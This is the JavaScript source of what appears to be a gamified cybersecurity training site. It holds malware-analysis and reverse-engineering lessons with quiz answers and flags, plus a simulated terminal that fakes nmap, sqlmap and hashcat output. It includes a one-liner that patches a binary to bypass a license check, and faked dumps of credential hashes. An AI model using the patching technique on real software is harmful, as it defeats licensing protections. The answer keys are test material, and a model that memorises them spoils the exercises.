    taskCount: 6,
    completedTasks: 0,
    xp: 350,
    users: 88000,
    color: 'red',
    description: 'Dissect real malware samples in a safe sandbox. Learn static & dynamic analysis techniques used by professional threat analysts.',
    tasks: [
      { id: 1, title: 'Task 1: What is Malware Analysis?', done: false, content: '<p class="text-gray-300 text-sm mb-4">Malware analysis is the process of understanding the purpose, functionality, and potential impact of malware. It is a critical skill for incident responders, SOC analysts, and threat hunters.</p><p class="text-gray-300 text-sm mb-4">There are two primary approaches:</p><ul class="text-gray-400 text-xs space-y-1 mb-4 ml-4 list-disc"><li><b class="text-white">Static Analysis</b> — examine the file WITHOUT running it (strings, hashes, imports)</li><li><b class="text-white">Dynamic Analysis</b> — run it in a sandbox and watch its behavior (network calls, file writes, registry changes)</li></ul><div class="bg-amber-900/20 border border-amber-500/30 rounded-lg p-3 mb-4"><p class="text-amber-300 text-xs font-bold">⚠️ NEVER run malware on your host machine. Always use isolated VMs or sandboxes!</p></div><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">file malware.exe\nmd5sum malware.exe\nstrings malware.exe | head -50</pre>', q: 'What type of analysis runs the malware in a controlled environment?', answer: 'dynamic analysis', hint: 'You observe its behavior by actually executing it', points: 10 },
      { id: 2, title: 'Task 2: Static Analysis - File Identification', done: false, content: '<p class="text-gray-300 text-sm mb-4">Before running anything, identify what you are dealing with. The <code>file</code> command reads magic bytes to identify the true file type (not just the extension). Always compute hashes to check VirusTotal.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">file malware.exe\n# PE32 executable (GUI) Intel 80386, for MS Windows\n\nmd5sum malware.exe\nsha256sum malware.exe\n\n# Check VirusTotal (submit hash, not file)\n# https://www.virustotal.com/</pre>', q: 'What command identifies a file by its magic bytes, not its extension?', answer: 'file', hint: 'A 4-letter command used for file type identification', points: 15 },
      { id: 3, title: 'Task 3: Extracting Strings', done: false, content: '<p class="text-gray-300 text-sm mb-4">The <code>strings</code> utility extracts printable character sequences from binary files. This can reveal hardcoded URLs, IPs, file paths, registry keys, API calls, and error messages — all valuable IOCs (Indicators of Compromise).</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">strings malware.exe\nstrings -n 8 malware.exe        # min length 8\nstrings malware.exe | grep -i http\nstrings malware.exe | grep -iE "(cmd|powershell|registry|temp)"</pre>', q: 'What command extracts human-readable strings from a binary?', answer: 'strings', hint: 'Seven letters, the name of the Unix utility', points: 20 },
      { id: 4, title: 'Task 4: Dynamic Analysis with Sandbox', done: false, content: '<p class="text-gray-300 text-sm mb-4">Dynamic analysis involves executing the malware in an isolated environment and monitoring what it does. Free online sandboxes like <b>Any.run</b>, <b>Cuckoo</b>, and <b>Hybrid Analysis</b> do this automatically.</p><p class="text-gray-300 text-sm mb-4">On Linux, use <code>strace</code> and <code>ltrace</code> to trace system calls and library calls:</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">strace -o strace.log ./malware\nltrace -o ltrace.log ./malware\n\n# Monitor network connections\ntshark -i eth0 -w capture.pcap &\n./malware</pre>', q: 'What tool traces system calls made by a process on Linux?', answer: 'strace', hint: 'It starts with s and ends with trace', points: 25 },
      { id: 5, title: 'Task 5: Memory Forensics with Volatility', done: false, content: '<p class="text-gray-300 text-sm mb-4">Volatility is the industry-standard framework for memory forensics. After a malware infection, a memory dump preserves volatile artifacts (running processes, network connections, injected code) that disappear on reboot.</p><pre class="bg-[#0d1117] text-red-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">volatility -f memory.raw imageinfo\nvolatility -f memory.raw --profile=Win10x64 pslist\nvolatility -f memory.raw --profile=Win10x64 netscan\nvolatility -f memory.raw --profile=Win10x64 malfind\nvolatility -f memory.raw --profile=Win10x64 dumpfiles -D ./output/</pre>', q: 'What Volatility plugin lists running processes from a memory dump?', answer: 'pslist', hint: 'It lists all running processes — ps+list combined', points: 30 },
      { id: 6, title: 'Task 6: Report IOCs', done: false, content: '<p class="text-gray-300 text-sm mb-4">After analysis, document all Indicators of Compromise (IOCs) to share with your team and threat intelligence platforms. IOCs help block the threat across your organization.</p><div class="bg-[#0d1117] rounded-lg p-4 border border-[#30363d] text-xs mono mb-4"><p class="text-emerald-400 font-bold mb-2">## IOC Report — malware.exe</p><p class="text-gray-400">MD5: 5f4dcc3b5aa765d61d8327deb882cf99</p><p class="text-gray-400">C2 Server: 185.220.101.45:4444</p><p class="text-gray-400">Mutex: Global\\MalwareMutex_v2</p><p class="text-gray-400">Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</p><p class="text-gray-400">File Drop: %TEMP%\\svchost32.exe</p></div>', q: 'What does IOC stand for in threat intelligence?', answer: 'indicator of compromise', hint: 'Three words: a piece of evidence that a system has been breached', points: 50 }
    ]
  },
  {
    id: 'reversing',
    title: 'Reverse Engineering',
    icon: '⚙️',
    image: 'cyber_glitch.png',
    difficulty: 'hard',
    category: ['reversing','malware','hard'],
    tags: ['Ghidra','GDB','Assembly','RE'],
    taskCount: 6,
    completedTasks: 0,
    xp: 400,
    users: 62000,
    color: 'amber',
    description: 'Reverse engineer compiled binaries using Ghidra, GDB, and radare2. Understand assembly, crack license checks, and analyze obfuscated code.',
    tasks: [
      { id: 1, title: 'Task 1: Introduction to RE', done: false, content: '<p class="text-gray-300 text-sm mb-4">Reverse Engineering (RE) is the art of understanding compiled software without access to the source code. It is used for malware analysis, CTF challenges, vulnerability research, and software license auditing.</p><p class="text-gray-300 text-sm mb-4">Key tools in the RE toolkit:</p><ul class="text-gray-400 text-xs space-y-1 mb-4 ml-4 list-disc"><li><b class="text-white">Ghidra</b> — NSA-developed free decompiler</li><li><b class="text-white">GDB</b> — GNU Debugger (dynamic analysis)</li><li><b class="text-white">radare2</b> — powerful open-source RE framework</li><li><b class="text-white">objdump</b> — dump assembly from ELF binaries</li></ul><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">file crackme\nobjdump -d crackme | head -40\nreadelf -h crackme</pre>', q: 'Which NSA-developed tool decompiles binaries for free?', answer: 'ghidra', hint: 'An open-source project released by the NSA in 2019', points: 10 },
      { id: 2, title: 'Task 2: Reading Assembly', done: false, content: '<p class="text-gray-300 text-sm mb-4">Assembly is the lowest-level human-readable representation of machine code. x86/x64 assembly uses registers (rax, rbx, rsp, rip), memory addressing, and instructions like mov, cmp, jne, call, ret.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">; Classic license check pattern:\nmov    eax, [esp+8]    ; Load user input\ncmp    eax, 0x1337cafe  ; Compare with hardcoded key\njne    FAIL            ; Jump if NOT equal → fail\nmov    eax, 1          ; Return 1 = success\nret\n\n# The key is 0x1337cafe in decimal = 322044670</pre>', q: 'What assembly instruction jumps if the comparison was NOT equal?', answer: 'jne', hint: 'Jump Not Equal — 3 letters', points: 20 },
      { id: 3, title: 'Task 3: GDB Basics', done: false, content: '<p class="text-gray-300 text-sm mb-4">GDB (GNU Debugger) lets you pause execution, inspect registers, read memory, and step through assembly instruction by instruction.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">gdb ./crackme\n(gdb) info functions    # list all functions\n(gdb) disas main        # disassemble main\n(gdb) break *0x40118a   # set breakpoint at address\n(gdb) run AAAA          # run with argument\n(gdb) info registers    # view all registers\n(gdb) x/s $rdi          # examine string at rdi\n(gdb) p/x $eax          # print eax in hex\n(gdb) nexti             # next instruction</pre>', q: 'What GDB command sets a breakpoint at a memory address?', answer: 'break', hint: 'The command is "break" followed by the address', points: 25 },
      { id: 4, title: 'Task 4: Cracking a License Check', done: false, content: '<p class="text-gray-300 text-sm mb-4">Many CTF reversing challenges involve bypassing or patching a license/password check. The pattern is always: input is compared to a hardcoded value, and the result controls a conditional jump.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">gdb ./crackme\n(gdb) disas check_password\n# 0x40118a <+34>: cmp    DWORD PTR [rbp-0x4],0xcafe\n# 0x401191 <+41>: jne    0x4011a0 <fail>\n\n# Method 1: Find the key (0xcafe = 51966)\n./crackme 51966\n# Method 2: Patch the binary — change jne → je\npython3 -c "import sys; d=open(\'crackme\',\'rb\').read(); d=d.replace(b\'\\x75\',b\'\\x74\'); open(\'patched\',\'wb\').write(d)"</pre>', q: 'What is the hex value 0xcafe in decimal?', answer: '51966', hint: 'Convert hex to decimal: 12*16^3 + 10*16^2 + 15*16 + 14', points: 30 },
      { id: 5, title: 'Task 5: radare2 Analysis', done: false, content: '<p class="text-gray-300 text-sm mb-4">radare2 (r2) is a powerful, scriptable reverse engineering framework. It supports disassembly, debugging, patching, and scripting with its own language (r2pipe).</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">r2 -A crackme\n[0x00401080]> afl        # list all functions\n[0x00401080]> s main    # seek to main\n[0x00401080]> pdf       # print disassembly of function\n[0x00401080]> iz        # list all strings in binary\n[0x00401080]> /x cafe   # search for hex bytes\n[0x00401080]> q         # quit</pre>', q: 'What r2 command lists all strings in a binary?', answer: 'iz', hint: 'Two-letter r2 command: info + strings', points: 30 },
      { id: 6, title: 'Task 6: Capture the Flag!', done: false, content: '<p class="text-gray-300 text-sm mb-4">Use GDB or radare2 in the terminal to analyze the crackme binary and find the hidden flag. The flag is stored as a hardcoded string compared against your input.</p><pre class="bg-[#0d1117] text-amber-400 text-xs p-3 rounded-lg border border-[#30363d] mono mb-4">gdb ./crackme\n(gdb) info functions\n(gdb) disas main\n(gdb) disas validate_flag\n(gdb) break validate_flag\n(gdb) run AAAA\n(gdb) x/s $rdi\n# Look for the comparison string...</pre><div class="bg-amber-900/20 border border-amber-500/30 rounded-lg p-3 mt-3"><p class="text-amber-400 text-xs font-bold">💡 The flag is compared character-by-character in validate_flag(). Set a breakpoint and examine the registers!</p></div>', q: 'What is the hidden flag in the crackme binary?', answer: 'THM{r3v3rs3_m4st3r}', hint: 'Run gdb ./crackme and examine the string at $rsi after breaking at validate_flag', points: 60 }
    ]
  }
];

// ═══════════════════════════════════════════════════════════
//  ROOM CARD RENDERING
// ═══════════════════════════════════════════════════════════
const DIFF_STYLES = { easy: 'badge-easy', medium: 'badge-medium', hard: 'badge-hard' };
const COLOR_MAP = { emerald: '#10b981', amber: '#f59e0b', blue: '#3b82f6', red: '#ef4444', orange: '#f97316', pink: '#ec4899' };

function renderRooms(filter = 'all') {
    const grid = document.getElementById('rooms-grid');
    const filtered = filter === 'all' ? ROOMS : ROOMS.filter(r => r.category.includes(filter));
    grid.innerHTML = filtered.map((room, idx) => {
        const pct = Math.round((room.completedTasks / room.taskCount) * 100);
        const isComplete = room.completedTasks === room.taskCount;
        const statusText = isComplete ? '✓ Completed' : room.completedTasks > 0 ? 'In Progress' : 'Not Started';
        const statusColor = isComplete ? 'text-emerald-400' : room.completedTasks > 0 ? 'text-amber-400' : 'text-gray-500';
        const users = room.users >= 1000 ? (room.users / 1000).toFixed(0) + 'k' : room.users;
        return `
        <div onclick="openRoom('${room.id}')" class="room-card rounded-xl p-5 relative overflow-hidden flex flex-col h-full animate-fade-in" style="animation-delay: ${idx * 0.05}s; background: #111827; border: 1px solid #1f2937;">
            ${isComplete ? '<div class="absolute top-0 right-0 bg-emerald-500 text-black text-[10px] font-black px-3 py-1 rounded-bl-lg z-10">✓ COMPLETED</div>' : ''}
            <div class="h-40 relative overflow-hidden group mb-4" style="background: linear-gradient(135deg, ${COLOR_MAP[room.color]}33 0%, #0b0f19 100%);">
                ${room.image ? `<img src="/static/${room.image}" alt="${room.title}" class="absolute inset-0 w-full h-full object-cover opacity-50 group-hover:opacity-80 group-hover:scale-105 transition-all duration-500 ease-out">` : `<div class="absolute inset-0 flex items-center justify-center text-7xl opacity-20">${room.icon}</div>`}
                <!-- Dark gradient bottom fade -->
                <div class="absolute inset-0 bg-gradient-to-t from-[#111827] via-[#111827]/40 to-transparent pointer-events-none"></div>
                <!-- Color tint overlay -->
                <div class="absolute inset-0 pointer-events-none" style="background: linear-gradient(135deg, ${COLOR_MAP[room.color]}22 0%, transparent 60%);"></div>
                <!-- Tag badge -->
                <div class="absolute top-3 left-3 z-10">
                    <span class="bg-black/60 backdrop-blur-sm text-gray-200 text-[9px] uppercase font-bold px-2 py-1 rounded border border-white/10 tracking-wider">${room.tags[0] || 'Walkthrough'}</span>
                </div>
                <!-- XP badge top right -->
                <div class="absolute top-3 right-3 z-10">
                    <span class="text-[10px] font-black px-2 py-1 rounded-full" style="background: ${COLOR_MAP[room.color]}33; color: ${COLOR_MAP[room.color]}; border: 1px solid ${COLOR_MAP[room.color]}55;">+${room.xp} XP</span>
                </div>
            </div>
            <div class="p-4 flex-1 flex flex-col relative">
                <div class="flex items-start justify-between mb-1 gap-2">
                    <h3 class="font-black text-white text-base truncate flex-1" title="${room.title}">${room.title}</h3>
                </div>
                <p class="text-gray-400 text-[11px] mb-3 line-clamp-2 leading-relaxed flex-1">${room.description}</p>
                <div class="flex items-center gap-2 mb-3">
                     <span class="${DIFF_STYLES[room.difficulty]} text-[10px] px-2 py-0.5 rounded font-bold capitalize shadow">${room.difficulty}</span>
                     <span class="text-gray-500 text-[10px] font-bold flex items-center gap-1">👥 ${users}</span>
                </div>
                <div class="task-bar mb-2"><div class="task-fill" style="width:${pct}%; background: ${COLOR_MAP[room.color]};"></div></div>
                <div class="flex justify-between items-center mt-1">
                    <span class="text-[11px] text-emerald-400 font-black">+${room.xp} XP</span>
                    <span class="text-[10px] ${statusColor} font-bold">${statusText}</span>
                </div>
            </div>
        </div>`;
    }).join('');
}

function filterRooms(filter) {
    document.querySelectorAll('.room-chip').forEach(c => {
        c.className = 'room-chip text-xs font-bold px-4 py-1.5 rounded-full border border-gray-700 text-gray-400 bg-transparent hover:border-emerald-500/50 transition';
    });
    event.currentTarget.className = 'room-chip active-chip text-xs font-bold px-4 py-1.5 rounded-full border border-emerald-500 text-emerald-400 bg-emerald-500/10';
    renderRooms(filter);
}

// ═══════════════════════════════════════════════════════════
//  ATTACKBOX LOGIC
// ═══════════════════════════════════════════════════════════
let activeRoom = null;
let activeTask = 0;
let taskProgress = {};

function openRoom(roomId) {
    activeRoom = ROOMS.find(r => r.id === roomId);
    if (!activeRoom) return;
    activeTask = activeRoom.tasks.findIndex(t => !t.done);
    if (activeTask === -1) activeTask = 0;

    document.getElementById('room-title-bar').textContent = activeRoom.title;
    document.getElementById('attackbox-modal').style.display = 'flex';
    document.getElementById('attackbox-modal').style.flexDirection = 'column';

    renderTaskSidebar();
    loadTask(activeTask);

    // Clear and focus terminal
    document.getElementById('term-output').innerHTML = `<div class="text-emerald-600 mb-2">[*] Machine loaded: ${activeRoom.title} (10.10.14.2)</div>`;
    document.getElementById('term-input').focus();

    // Start countdown timer
    startTimer(7200);
}

function renderTaskSidebar() {
    const room = activeRoom;
    const pct = Math.round((room.tasks.filter(t => t.done || taskProgress[room.id + t.id]).length / room.taskCount) * 100);
    let html = `
        <div class="mb-5">
            <div class="flex items-center gap-2 mb-1">
                <span class="text-2xl">${room.icon}</span>
                <h2 class="font-black text-white text-lg">${room.title}</h2>
            </div>
            <div class="flex items-center gap-2 mb-3">
                <span class="${DIFF_STYLES[room.difficulty]} text-[9px] px-2 py-0.5 rounded-full font-bold capitalize">${room.difficulty}</span>
                <span class="text-gray-500 text-[10px]">+${room.xp} XP · ${room.taskCount} tasks</span>
            </div>
            <div class="task-bar mb-1"><div class="task-fill" style="width:${pct}%"></div></div>
            <div class="text-[10px] text-gray-500">${pct}% complete</div>
        </div>
        <div class="space-y-1 mb-6">`;
    room.tasks.forEach((task, i) => {
        const done = task.done || taskProgress[room.id + task.id];
        html += `<div class="task-item px-3 py-2.5 rounded-r-lg ${i === activeTask ? 'active' : done ? 'completed' : ''}" onclick="loadTask(${i})">
            <div class="flex items-center gap-2">
                <span class="w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-bold flex-shrink-0 ${done ? 'bg-emerald-500 text-black' : i === activeTask ? 'bg-emerald-500/20 border border-emerald-500 text-emerald-400' : 'bg-[#21262d] text-gray-500'}">${done ? '✓' : (i+1)}</span>
                <span class="text-xs ${done ? 'text-emerald-400' : i === activeTask ? 'text-white' : 'text-gray-500'} font-${i === activeTask ? 'bold' : 'normal'} truncate">${task.title}</span>
            </div>
        </div>`;
    });
    html += '</div>';
    document.getElementById('room-content').innerHTML = html;
}

function loadTask(taskIdx) {
    activeTask = taskIdx;
    const task = activeRoom.tasks[taskIdx];
    const room = activeRoom;
    const done = task.done || taskProgress[room.id + task.id];

    let html = `<div class="mb-5">
        <div class="section-label mb-1">Task ${task.id}</div>
        <h3 class="font-black text-white text-base mb-3">${task.title.replace('Task '+ task.id + ': ', '')}</h3>
        <div class="prose-sm text-gray-400 space-y-3">${task.content}</div>
    </div>`;

    html += `<div class="bg-[#161b22] border border-[#30363d] rounded-xl p-4">
        <p class="text-xs font-black text-white mb-3">❓ ${task.q}</p>
        <div class="flex gap-2 mb-2">
            <input type="text" id="task-ans" class="ans-input flex-1 ${done ? 'ans-correct' : ''}" placeholder="Your answer..." value="${done ? '✓ Correct!' : ''}">
            <button onclick="checkAnswer(${taskIdx})" class="text-xs font-black px-4 py-2 rounded-lg text-white transition ${done ? 'bg-emerald-700 cursor-default' : 'bg-emerald-600 hover:bg-emerald-500'}">
                ${done ? '✓' : 'Submit'}
            </button>
        </div>
        <div class="flex justify-between">
            <button onclick="showHint(${taskIdx})" class="text-[10px] text-gray-600 hover:text-gray-400 transition">💡 Show Hint</button>
            <span class="text-[10px] text-emerald-400 font-bold">+${task.points} pts</span>
        </div>
        <div id="hint-box-${taskIdx}" class="hidden mt-2 text-xs text-amber-400 bg-amber-900/20 border border-amber-500/20 rounded-lg p-2">
            💡 ${task.hint}
        </div>
    </div>`;

    html += `<div class="flex gap-2 mt-4">
        ${taskIdx > 0 ? `<button onclick="loadTask(${taskIdx-1})" class="flex-1 text-xs bg-[#21262d] hover:bg-[#30363d] text-gray-300 py-2 rounded-lg transition font-bold">← Prev Task</button>` : ''}
        ${taskIdx < activeRoom.tasks.length - 1 ? `<button onclick="loadTask(${taskIdx+1})" class="flex-1 text-xs bg-[#21262d] hover:bg-[#30363d] text-gray-300 py-2 rounded-lg transition font-bold">Next Task →</button>` : '<button class="flex-1 text-xs bg-emerald-700/50 text-emerald-400 py-2 rounded-lg font-bold cursor-default">🎉 Final Task</button>'}
    </div>`;

    document.getElementById('room-content').innerHTML = document.getElementById('room-content').innerHTML.split('<div class="mb-5">')[0];
    renderTaskSidebar();
    document.getElementById('room-content').innerHTML += html;
}

function checkAnswer(taskIdx) {
    const task = activeRoom.tasks[taskIdx];
    const input = document.getElementById('task-ans');
    const val = input.value.trim().toLowerCase();
    const correct = task.answer.toLowerCase();
    if (val === correct || val.includes(correct) || correct.includes(val)) {
        input.className = 'ans-input flex-1 ans-correct';
        taskProgress[activeRoom.id + task.id] = true;
        input.value = '✓ Correct! +' + task.points + ' pts';
        // Show XP animation
        showXP(task.points);
        setTimeout(() => { if (taskIdx < activeRoom.tasks.length - 1) loadTask(taskIdx + 1); renderTaskSidebar(); }, 1200);
    } else {
        input.className = 'ans-input flex-1 ans-wrong';
        input.placeholder = '✗ Wrong — try again!';
        input.value = '';
        setTimeout(() => { input.className = 'ans-input flex-1'; input.placeholder = 'Your answer...'; }, 1500);
    }
}

function showHint(taskIdx) {
    const hintBox = document.getElementById('hint-box-' + taskIdx);
    if (hintBox) hintBox.classList.toggle('hidden');
}

function showXP(pts) {
    const el = document.createElement('div');
    el.className = 'fixed top-20 right-8 z-[999] font-black text-emerald-400 text-xl';
    el.style.cssText = 'animation: slideUp 1.5s ease forwards; pointer-events:none;';
    el.textContent = '+' + pts + ' XP';
    document.body.appendChild(el);
    const style = document.createElement('style');
    style.textContent = '@keyframes slideUp { 0%{opacity:1;transform:translateY(0)} 100%{opacity:0;transform:translateY(-60px)} }';
    document.head.appendChild(style);
    setTimeout(() => el.remove(), 1600);
}

let timerInterval;
function startTimer(seconds) {
    clearInterval(timerInterval);
    const el = document.getElementById('room-timer');
    el.classList.remove('hidden');
    timerInterval = setInterval(() => {
        const h = Math.floor(seconds/3600).toString().padStart(2,'0');
        const m = Math.floor((seconds%3600)/60).toString().padStart(2,'0');
        const s = (seconds%60).toString().padStart(2,'0');
        el.textContent = `⏱ ${h}:${m}:${s} left`;
        if (seconds-- <= 0) { clearInterval(timerInterval); el.textContent = '⏱ Expired'; }
    }, 1000);
}

function closeAttackBox() {
    document.getElementById('attackbox-modal').style.display = 'none';
    clearInterval(timerInterval);
    document.getElementById('room-timer').classList.add('hidden');
}

// ═══════════════════════════════════════════════════════════
//  DYNAMIC TERMINAL COMMANDS
// ═══════════════════════════════════════════════════════════
function nmapOutput(parts) {
    const target = parts[parts.length - 1] || '10.10.14.2';
    return `<div>Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().slice(0,19).replace('T',' ')} UTC</div>
<div>Nmap scan report for ${target}</div>
<div>Host is up (0.041s latency).</div>
<div>Not shown: 998 closed tcp ports (reset)</div>
<div>PORT   STATE SERVICE VERSION</div>
<div>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</div>
<div>80/tcp open  http    <span class="bg-red-900/50 text-red-300 font-bold px-1">Apache httpd 2.4.49</span> ((Debian))</div>
<div>|_http-title: Apache2 Debian Default Page</div>
<div></div>
<div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
<div></div>
<div class="text-emerald-600">Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds</div>`;
}


// ═══════════════════════════════════════════════════════════
//  KALI LINUX TERMINAL ENGINE  — smart pattern matching
// ═══════════════════════════════════════════════════════════
const now = () => new Date().toISOString().slice(0,19).replace('T',' ');
const rnd = (a,b) => (Math.random()*(b-a)+a).toFixed(3);

// Ordered list of [regex, delay_ms, output_fn(raw, parts)]
const TERM_RULES = [

  // ── clear ──────────────────────────────────────────────
  [/^clear$/, 0, () => '__CLEAR__'],

  // ── nmap ───────────────────────────────────────────────
  [/^(sudo )?nmap\b/, 1800, (r, p) => {
    const t = p.find(x => /^[\d.]+$|^[a-z][\w.-]+\.[a-z]{2,}$/i.test(x)) || '10.10.14.2';
    const sV = r.includes('-sV') || r.includes('-A');
    const oS = r.includes('-O') || r.includes('-A');
    
    let portsHTML = `22/tcp&nbsp; open&nbsp; ssh${sV ? '&nbsp;&nbsp;&nbsp;&nbsp; <span class="text-cyan-400">OpenSSH 8.2p1 Ubuntu</span>' : ''}<br>80/tcp&nbsp; open&nbsp; http${sV ? '&nbsp;&nbsp;&nbsp;&nbsp;<span class="bg-red-900/50 text-red-300 font-bold px-1">Apache httpd 2.4.49</span>' : ''}<br>`;
    let osDetails = `Linux 4.X|5.X (96%)`;

    const isInternal = t.startsWith('10.') || t.startsWith('192.') || t.startsWith('172.') || t === 'localhost' || t.includes('thm');

    if (isInternal && typeof activeRoom !== 'undefined' && activeRoom) {
      if (activeRoom.id === 'privesc') {
        portsHTML = `22/tcp&nbsp; open&nbsp; ssh${sV ? '&nbsp;&nbsp;&nbsp;&nbsp; <span class="text-cyan-400">OpenSSH 7.6p1 Ubuntu</span>' : ''}<br>3306/tcp open&nbsp; mysql${sV ? '&nbsp;&nbsp;&nbsp;<span class="text-cyan-400">MySQL 5.7.33</span>' : ''}<br>`;
        osDetails = `Ubuntu Linux 18.04`;
      } else if (activeRoom.id === 'malware') {
        portsHTML = `445/tcp&nbsp; open&nbsp; microsoft-ds<br>4444/tcp open&nbsp; krb524${sV ? '&nbsp;&nbsp;&nbsp;<span class="text-red-400 font-bold">Metasploit Meterpreter</span>' : ''}<br>`;
        osDetails = `Windows 10 / Windows Server 2019`;
      } else if (activeRoom.id === 'crypto' || activeRoom.id === 'reversing') {
        portsHTML = `22/tcp&nbsp; open&nbsp; ssh<br>80/tcp&nbsp; open&nbsp; http<br>443/tcp&nbsp; open&nbsp; https<br>`;
      }
    } else if (!isInternal) {
      // Deterministic pseudo-random generation based on target name for external domains
      let hash = 0;
      for (let i = 0; i < t.length; i++) hash += t.charCodeAt(i);
      const profiles = [
        { p: `80/tcp&nbsp; open&nbsp; http<br>443/tcp&nbsp; open&nbsp; https<br>`, o: 'Linux 3.X|4.X' },
        { p: `22/tcp&nbsp; open&nbsp; ssh<br>80/tcp&nbsp; open&nbsp; http<br>443/tcp&nbsp; open&nbsp; https<br>3306/tcp closed mysql<br>`, o: 'Ubuntu Linux' },
        { p: `80/tcp&nbsp; open&nbsp; http<br>443/tcp&nbsp; open&nbsp; https<br>8080/tcp open&nbsp; http-proxy<br>`, o: 'FreeBSD' },
        { p: `21/tcp&nbsp; open&nbsp; ftp<br>22/tcp&nbsp; open&nbsp; ssh<br>80/tcp&nbsp; open&nbsp; http<br>`, o: 'Linux 2.6.x' },
        { p: `80/tcp&nbsp; open&nbsp; http<br>443/tcp&nbsp; open&nbsp; https<br>8443/tcp open&nbsp; https-alt<br>`, o: 'Debian Linux' }
      ];
      const prof = profiles[hash % profiles.length];
      portsHTML = prof.p;
      osDetails = prof.o;
    }

    let out = `<span class="text-emerald-400">Starting Nmap 7.94 ( https://nmap.org ) at ${now()} UTC</span><br>`;
    out += `Nmap scan report for ${t}<br>Host is up (${rnd(0.010,0.080)}s latency).<br>`;
    out += `Not shown: 998 closed tcp ports (reset)<br>PORT&nbsp;&nbsp;&nbsp;STATE SERVICE${sV?' VERSION':''}<br>`;
    out += portsHTML;
    if (oS) out += `<br>OS details: <span class="text-yellow-400">${osDetails}</span><br>`;
    out += `<br>Service Info: OS: ${osDetails.split(' ')[0]}; CPE: cpe:/o:${osDetails.split(' ')[0].toLowerCase()}<br>`;
    out += `<span class="text-emerald-600">Nmap done: 1 IP address (1 host up) scanned in ${rnd(3,12)} seconds</span>`;
    return out;
  }],

  // ── sqlmap ─────────────────────────────────────────────
  [/^sqlmap\b/, 2200, (r) => {
    const dump = r.includes('--dump');
    let out = `<span class="text-amber-400">&nbsp;&nbsp;&nbsp;&nbsp;___<br>&nbsp;&nbsp;&nbsp;__H__<br>___ ___[,]_____ ___ ___&nbsp; {1.7.8#stable}<br>|_ -| . [']&nbsp;&nbsp;&nbsp;&nbsp; | .'| . |<br>|___|_&nbsp; [']_|_|_|__,|&nbsp; _|<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_|V...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |_|&nbsp;&nbsp; https://sqlmap.org</span><br><br>[*] starting @ ${now()}<br>`;
    
    let dbName = 'cyberspace_users';
    let flagData = `|&nbsp; 1 | admin | <span class="text-red-400 font-bold">5f4dcc3b5aa765d61d8327deb882cf99</span> |<br>|&nbsp; 2 | jane&nbsp; | 0d107d09f5bbe40cade3de5c71e9e9b7 |`;
    
    if (typeof activeRoom !== 'undefined' && activeRoom && activeRoom.id === 'sqlmap') {
       dbName = 'web_store_db';
       flagData = `|&nbsp; 1 | admin | <span class="text-red-400 font-bold">THM{sql_1nj3ct10n_m4st3r}</span> |<br>|&nbsp; 2 | user&nbsp; | password123 |`;
    }

    if (dump) {
      out += `[+] fetching table: users<br>Database: ${dbName}<br>Table: users<br>+----+-------+----------------------------------+<br>| id | user&nbsp; | password_hash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<br>+----+-------+----------------------------------+<br>${flagData}<br>+----+-------+----------------------------------+<br>`;
    } else {
      out += `[+] fetching database names...<br>available databases [2]:<br>[*] information_schema<br>[*] <span class="text-emerald-400 font-bold">${dbName}</span><br>`;
    }
    out += `<br>[*] ending @ ${now()}`;
    return out;
  }],

  // ── hashcat ────────────────────────────────────────────
  [/^hashcat\b/, 1400, (r) => {
    if (r.includes('-h') || r.includes('--help')) {
      return `hashcat (v6.2.6) starting in help mode<br>Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]<br><br>Options:<br>&nbsp;-m, --hash-type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1000=NTLM, 0=MD5, 1800=sha512crypt, 1400=SHA256<br>&nbsp;-a, --attack-mode&nbsp;&nbsp; 0=dict, 1=combo, 3=mask, 6=hybrid<br>&nbsp;-r, --rules-file&nbsp;&nbsp;&nbsp;e.g. best64.rule<br>&nbsp;-O, --optimized-kernel-enable<br>`;
    }
    const mode = (r.match(/-m\s+(\d+)/) || [])[1] || '0';
    const modeNames = {'0':'MD5','1000':'NTLM','1800':'sha512crypt','1400':'SHA256','500':'md5crypt','3200':'bcrypt'};
    const n = modeNames[mode] || mode;
    
    let crack1 = `5f4dcc3b5aa765d61d8327deb882cf99:<span class="text-red-400 font-bold">password</span>`;
    let crack2 = `0d107d09f5bbe40cade3de5c71e9e9b7:<span class="text-red-400 font-bold">letmein</span>`;
    
    if (typeof activeRoom !== 'undefined' && activeRoom && activeRoom.id === 'crypto') {
        crack1 = `hash1:<span class="text-red-400 font-bold">THM{h4sh_cr4ck3r}</span>`;
    }

